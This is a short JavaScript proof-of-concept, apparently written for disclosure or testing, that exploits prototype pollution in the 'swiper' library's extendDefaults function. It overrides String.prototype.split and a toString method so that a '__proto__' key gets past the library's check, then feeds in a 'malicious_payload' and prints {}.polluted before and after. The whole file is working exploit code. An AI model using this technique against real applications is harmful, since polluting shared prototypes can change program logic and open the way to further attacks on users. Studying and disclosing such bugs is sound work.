var arg = ['__proto__'];
var flag1 = true;
arg.toString = function () {
    if (flag1) {
        flag1 = false;
        return 'foo';
    } else {
        return '__proto__';
    }
};
String.prototype.split = function () {
    return [
        arg,
        'polluted'
    ];
};
var swiper = require('swiper');
let obj = {};
var malicious_payload = '{"constructor.prototype": {"polluted":"yes"}}';
console.log({}.polluted);
swiper.default.extendDefaults(JSON.parse(malicious_payload));
console.log({}.polluted);